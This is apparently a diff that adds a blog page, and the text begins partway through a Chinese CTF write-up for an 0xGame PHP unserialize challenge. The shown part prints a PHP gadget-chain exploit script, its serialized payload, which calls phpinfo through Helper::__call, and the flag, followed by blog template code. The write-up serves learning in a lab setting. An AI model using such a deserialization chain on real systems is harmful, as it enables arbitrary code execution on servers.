+    public $value;
+    public $expired;
+    public $helper;
+
+    public function __construct($key, $value, $helper) &#123;
+        $this-&gt;key = $key;
+        $this-&gt;value = $value;
+        $this-&gt;helper = $helper;
+
+        $this-&gt;expired = False;
+    &#125;
+
+    public function __wakeup() &#123;
+        $this-&gt;expired = False;
+    &#125;
+
+    public function expired() &#123;
+        if ($this-&gt;expired) &#123;
+            $this-&gt;helper-&gt;clean($this-&gt;key);
+            return True;
+        &#125; else &#123;
+            return False;
+        &#125;
+    &#125;
+&#125;
+
+class Storage &#123;
+    public $store;
+
+    public function __construct() &#123;
+        $this-&gt;store = array();
+    &#125;
+
+    public function __set($name, $value) &#123;//2
+        if (!$this-&gt;store) &#123;
+            $this-&gt;store = array();
+        &#125;
+
+        if (!$value-&gt;expired()) &#123;//3
+            $this-&gt;store[$name] = $value;
+        &#125;
+    &#125;
+
+    public function __get($name) &#123;
+        return $this-&gt;data[$name];
+    &#125;
+&#125;
+
+class Helper &#123;
+    public $funcs;
+
+    public function __construct($funcs) &#123;
+        $this-&gt;funcs = $funcs;
+    &#125;
+
+    public function __call($name, $args) &#123;
+        $this-&gt;funcs[$name](...$args);
+    &#125;
+&#125;
+
+class DataObject &#123;
+    public $storage;
+    public $data;
+
+    public function __destruct() &#123;//1
+        foreach ($this-&gt;data as $key =&gt; $value) &#123;
+            $this-&gt;storage-&gt;$key = $value;
+        &#125;
+    &#125;
+&#125;
+
+//if (isset($_GET[&#39;u&#39;])) &#123;
+//    unserialize($_GET[&#39;u&#39;]);
+//&#125;
+$a=new DataObject();
+$b=new Storage();
+$c=new Helper();
+$c-&gt;funcs[&#39;expired&#39;]=&quot;phpinfo&quot;;
+$d=new Cache();
+$a-&gt;storage=$b;
+$a-&gt;data[&quot;sss&quot;]=$c;
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>有点非预期，少用了一个类，不用绕过wakeup了</p>
+<pre><code>O:10:&quot;DataObject&quot;:2:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;a:0:&#123;&#125;&#125;s:4:&quot;data&quot;;a:1:&#123;s:3:&quot;sss&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:7:&quot;expired&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#125;
+</code></pre>
+<pre><code>0xGame&#123;4d961b66-fdbb-410f-9955-558d14f1e308&#125;
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
+        <script type="text/javascript">
+			(function(d, s) {
+				var j, e = d.getElementsByTagName(s)[0];
+
+				if (typeof LivereTower === 'function') { return; }
+
+				j = d.createElement(s);
+				window.livereOptions = {
+					eagerLoading: true,
+					scrollEventTargetSelector: '#post'
+                }
+				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+				j.async = true;
+				e.parentNode.insertBefore(j, e);
+			})(document, 'script');
+        </script>
+        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 ttycp3
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+    
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+    
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+    
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+    
+        
+        
+    }
+    
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+    .nav-right nav a.hover > span{
+        color: #ffffff !important;
+    }
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+    
+    /* 背景图样式 */
+    
+    #post {
+        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+    
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+    
+    
+</style>
+
+
+
+
+
+
+
+
+
+
+</html>
